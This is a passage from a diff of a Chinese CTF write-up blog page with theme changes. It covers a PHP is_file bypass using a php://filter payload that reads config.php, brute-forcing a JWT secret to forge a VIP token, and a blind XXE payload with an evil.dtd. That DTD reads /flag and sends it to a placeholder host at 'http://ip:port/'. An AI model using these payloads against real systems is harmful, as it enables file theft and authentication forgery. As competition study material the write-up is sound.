+<p>&#x91CD;&#x65B0;&#x767B;&#x5F55;,&#x663E;&#x793A;no&#xFF0C;&#x8BF4;&#x660E;&#x5DF2;&#x7ECF;&#x7ED5;&#x8FC7;is_guest</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde24a0ec43273869.jpg" alt="web4_no.jpg"></p>
-<p>最后还需要用PHP伪协议绕过is_file函数</p>
-<pre><code>payload：
+<p>&#x6700;&#x540E;&#x8FD8;&#x9700;&#x8981;&#x7528;PHP&#x4F2A;&#x534F;&#x8BAE;&#x7ED5;&#x8FC7;is_file&#x51FD;&#x6570;</p>
+<pre><code>payload&#xFF1A;
 member.php?file=php://filter/read/convert.base64-encode/resource=config.php
-</code></pre><p>读config.php得到flag的base64，解码即可。</p>
-<h3 id="龙湖论坛"><a href="#龙湖论坛" class="headerlink" title="龙湖论坛"></a>龙湖论坛</h3><p>比赛的时候还没有接触过JWT，也没有时间做了，这里就相当于复现了。</p>
-<p>一个论坛，只有简单的注册，登录和一个留言功能。</p>
-<p>RSS订阅需要先成为VIP。</p>
+</code></pre><p>&#x8BFB;config.php&#x5F97;&#x5230;flag&#x7684;base64&#xFF0C;&#x89E3;&#x7801;&#x5373;&#x53EF;&#x3002;</p>
+<h3 id="&#x9F99;&#x6E56;&#x8BBA;&#x575B;"><a href="#&#x9F99;&#x6E56;&#x8BBA;&#x575B;" class="headerlink" title="&#x9F99;&#x6E56;&#x8BBA;&#x575B;"></a>&#x9F99;&#x6E56;&#x8BBA;&#x575B;</h3><p>&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;JWT&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x505A;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x590D;&#x73B0;&#x4E86;&#x3002;</p>
+<p>&#x4E00;&#x4E2A;&#x8BBA;&#x575B;&#xFF0C;&#x53EA;&#x6709;&#x7B80;&#x5355;&#x7684;&#x6CE8;&#x518C;&#xFF0C;&#x767B;&#x5F55;&#x548C;&#x4E00;&#x4E2A;&#x7559;&#x8A00;&#x529F;&#x80FD;&#x3002;</p>
+<p>RSS&#x8BA2;&#x9605;&#x9700;&#x8981;&#x5148;&#x6210;&#x4E3A;VIP&#x3002;</p>
 <p><img src="![web5_tpvip.jpg](https://i.loli.net/2019/05/17/5cde24dd697f768705.jpg" alt="pic">)</p>
-<p>登录之后，可以在cookie值里面看到token</p>
+<p>&#x767B;&#x5F55;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;cookie&#x503C;&#x91CC;&#x9762;&#x770B;&#x5230;token</p>
 <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzeXMiLCJ1c2VybmFtZSI6ImFkbWluIiwiaXN2aXAiOjAsImlhdCI6MTU1NzkyODE2NSwiZXhwIjoxNTU3OTMxNzY1LCJuYmYiOjE1NTc5MjgxNjUsImp0aSI6IjBlMjM5MTI4OWZmMmNmZTc0NjUxZjIyMDlkYzk5YmI1In0.WKRwWB3QE6CG3BYi3WGQ9EBIX3g_YCT26bJsaDMGsXo
-</code></pre><p>解密后的格式为：</p>
+</code></pre><p>&#x89E3;&#x5BC6;&#x540E;&#x7684;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;</p>
 <pre><code>{
   &quot;alg&quot;: &quot;HS256&quot;,
   &quot;typ&quot;: &quot;JWT&quot;
@@ -364,329 +233,268 @@ member.php?file=php://filter/read/convert.base64-encode/resource=config.php
   &quot;nbf&quot;: 1557928165,
   &quot;jti&quot;: &quot;0e2391289ff2cfe74651f2209dc99bb5&quot;
 }
-</code></pre><p>我们需要得到密钥，来修改isvip的值为1。</p>
-<p>这里可以使用工具：<a href="https://github.com/Sjord/jwtcrack" target="_blank" rel="noopener">https://github.com/Sjord/jwtcrack</a> 来爆破密钥。</p>
-<p>构造密钥后爆破得到密钥为sicnuctf</p>
+</code></pre><p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5F97;&#x5230;&#x5BC6;&#x94A5;&#xFF0C;&#x6765;&#x4FEE;&#x6539;isvip&#x7684;&#x503C;&#x4E3A;1&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5DE5;&#x5177;&#xFF1A;<a href="https://github.com/Sjord/jwtcrack" target="_blank" rel="noopener">https://github.com/Sjord/jwtcrack</a> &#x6765;&#x7206;&#x7834;&#x5BC6;&#x94A5;&#x3002;</p>
+<p>&#x6784;&#x9020;&#x5BC6;&#x94A5;&#x540E;&#x7206;&#x7834;&#x5F97;&#x5230;&#x5BC6;&#x94A5;&#x4E3A;sicnuctf</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde24dd77fb099016.jpg" alt="web5_rss.jpg"></p>
-<p>使用在线工具<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 修改JWT的值，然后修改cookie的token即可进入rss订阅页面。</p>
+<p>&#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x5DE5;&#x5177;<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> &#x4FEE;&#x6539;JWT&#x7684;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;cookie&#x7684;token&#x5373;&#x53EF;&#x8FDB;&#x5165;rss&#x8BA2;&#x9605;&#x9875;&#x9762;&#x3002;</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde24dd7c86615595.jpg" alt="web5_findkey.jpg"></p>
-<p>看Writeup知道，这里是一个Blind XXE。</p>
-<p>由于环境配置，这里复现不了这个XXE，直接贴师傅的脚本了：</p>
+<p>&#x770B;Writeup&#x77E5;&#x9053;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x4E00;&#x4E2A;Blind XXE&#x3002;</p>
+<p>&#x7531;&#x4E8E;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#xFF0C;&#x8FD9;&#x91CC;&#x590D;&#x73B0;&#x4E0D;&#x4E86;&#x8FD9;&#x4E2A;XXE&#xFF0C;&#x76F4;&#x63A5;&#x8D34;&#x5E08;&#x5085;&#x7684;&#x811A;&#x672C;&#x4E86;&#xFF1A;</p>
 <p>payload.xml</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root SYSTEM "http://ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;p;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE root SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;p;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>evil.dtd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY p SYSTEM &apos;http://ip:port/%p1;&apos;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>
-<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>接触到了两个新东西：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY p SYSTEM &apos;http://ip:port/%p1;&apos;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>
+
+<h2 id="&#x540E;&#x8BDD;"><a href="#&#x540E;&#x8BDD;" class="headerlink" title="&#x540E;&#x8BDD;"></a>&#x540E;&#x8BDD;</h2><p>&#x63A5;&#x89E6;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x65B0;&#x4E1C;&#x897F;&#xFF1A;</p>
 <ol>
-<li>php的条件竞争</li>
+<li>php&#x7684;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;</li>
 <li>JWT</li>
 </ol>
-<p>后期还要更多的总结一下。</p>
+<p>&#x540E;&#x671F;&#x8FD8;&#x8981;&#x66F4;&#x591A;&#x7684;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002;</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Writeup/">#Writeup</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/05/17/JWT备忘录/">JWT备忘录</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/04/27/2019全国大学生信息安全竞赛WEB1_Writeuo/">2019全国大学生信息安全竞赛反序列化题目复现</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
 
     </div>
-
-    
-    
-    
-        
-      
-
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
-            
-          </div>
-        
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/04/27/2019全国大学生信息安全竞赛WEB1_Writeuo/" rel="next" title="2019全国大学生信息安全竞赛反序列化题目复现">
-                  <i class="fa fa-chevron-left"></i> 2019全国大学生信息安全竞赛反序列化题目复现
-                </a>
-              
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
             </div>
+            <div class="column is-hidden-mobile"></div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/05/17/JWT备忘录/" rel="prev" title="JWT备忘录">
-                  JWT备忘录 <i class="fa fa-chevron-right"></i>
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
                 </a>
-              
+                
+                </div>
             </div>
-          </div>
-        
-      </footer>
-    
-  </div>
-  
-  
-  
-  </article>
-
-  </div>
-
-
-          </div>
-          
-
+            
+            
         </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-  </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
-          Inhaltsverzeichnis
-        </li>
-        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-          Übersicht
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#说在前面"><span class="nav-number">1.</span> <span class="nav-text">说在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#418"><span class="nav-number">2.1.</span> <span class="nav-text">418</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#签到题"><span class="nav-number">2.2.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP是世界上最好的语言"><span class="nav-number">2.3.</span> <span class="nav-text">PHP是世界上最好的语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#龙湖论坛"><span class="nav-number">2.4.</span> <span class="nav-text">龙湖论坛</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后话"><span class="nav-number">3.</span> <span class="nav-text">后话</span></a></li></ol></div>
-          </div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Threezh1</p>
-  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
-  <nav class="site-state motion-element">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">34</span>
-          <span class="site-state-item-name">Artikel</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">Kategorien</span>
-        
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">21</span>
-        <span class="site-state-item-name">schlagwörter</span>
-        
-      </div>
-    
-  </nav>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-    
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
-      </span>
-    
-  </div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
 
 
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
 
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Escribe algo...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-      </div>
-
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Threezh1</span>
 </div>
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Tags',
+                UNTITLED: '(Sin título)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-  </div>
-
-  
-  <script src="/lib/jquery/index.js?v=3.4.1"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
-<script src="/js/schemes/pisces.js?v=7.3.0"></script>
-<script src="/js/next-boot.js?v=7.3.0"></script>
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-
-  
-  <script src="/js/post-details.js?v=7.3.0"></script>
-
-
 </body>
 </html>
